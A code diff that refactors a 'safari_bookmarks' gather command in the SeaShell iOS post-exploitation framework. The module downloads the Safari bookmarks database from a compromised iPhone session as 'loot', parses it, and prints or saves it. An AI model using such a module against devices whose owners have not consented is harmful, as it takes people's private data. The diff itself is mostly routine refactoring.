@@ -5,18 +5,15 @@ Current source: https://github.com/EntySec/SeaShell
 
 import json
 
+from pex.db import DB
 from seashell.lib.loot import Loot
 
-from pex.db import DB
-
-from hatsploit.lib.command import Command
+from badges.cmd import Command
 
 
-class HatSploitCommand(Command):
+class ExternalCommand(Command, DB):
     def __init__(self):
-        super().__init__()
-
-        self.details = {
+        super().__init__({
             'Category': "gather",
             'Name': "safari_bookmarks",
             'Authors': [
@@ -25,14 +22,12 @@ class HatSploitCommand(Command):
             'Description': "View Safari bookmarks or save as json.",
             'Usage': "safari_bookmarks [local_file]",
             'MinArgs': 0
-        }
-
-        self.db = DB()
+        })
 
         self.db_file = '/private/var/mobile/Library/Safari/Bookmarks.db'
         self.wal_file = '/private/var/mobile/Library/Safari/Bookmarks.db-wal'
 
-    def run(self, argc, argv):
+    def run(self, args):
         if not self.session.download(
                 self.db_file, Loot().specific_loot('Bookmarks.db')):
             return
@@ -44,18 +39,18 @@ class HatSploitCommand(Command):
         self.print_process("Parsing bookmarks database...")
 
         try:
-            bookmarks = self.db.parse_safari_bookmarks(
+            bookmarks = self.parse_safari_bookmarks(
                 Loot().specific_loot('Bookmarks.db'))
         except Exception:
             self.print_error("Failed to parse bookmarks database!")
             return
 
-        if argc >= 2:
-            with open(argv[1], 'w') as f:
-                self.print_process(f"Saving bookmarks to {argv[1]}...")
+        if len(args) >= 2:
+            with open(args[1], 'w') as f:
+                self.print_process(f"Saving bookmarks to {args[1]}...")
                 json.dump(bookmarks, f)
 
-            self.print_success(f"Saved bookmarks to {argv[1]}!")
+            self.print_success(f"Saved bookmarks to {args[1]}!")
             return
 
         bookmarks_data = []
